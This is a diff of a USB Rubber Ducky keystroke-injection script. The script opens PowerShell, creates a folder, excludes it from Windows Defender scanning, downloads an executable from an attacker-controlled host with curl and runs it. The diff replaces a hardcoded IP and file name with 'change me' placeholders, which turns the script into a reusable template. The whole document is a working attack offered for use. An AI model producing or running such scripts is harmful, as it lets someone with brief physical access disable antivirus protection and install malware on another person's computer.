@@ -15,19 +15,19 @@ DELAY 200
 STRING powershell
 DELAY 500
 ENTER
-STRING mkdir C:\TEMP2
+STRING mkdir C:\<created folder of your choice> ### change me ###
 DELAY 100
 ENTER
-STRING Add-MpPreference -ExclusionPath 'C:\TEMP2'
+STRING Add-MpPreference -ExclusionPath 'C:\folder of your choice' ### change me ###
 ENTER
 DELAY 500
-STRING curl http://192.168.1.131:80/Tyler2.exe -o C:\TEMP2\Tyler2.exe
+STRING curl http:/<---IP---->:<PORT>/payload.exe -o C:\folder_of_choice\created_payload.exe ### change me ###
 ENTER
 DELAY 500
-STRING cd C:\TEMP2
+STRING cd C:\<created folder> 
 ENTER
 DELAY 200
-STRING .\Tyler2.exe
+STRING .\payload.exe ### change to desired, compiled payload ###
 ENTER
 DELAY 1000
 STRING exit
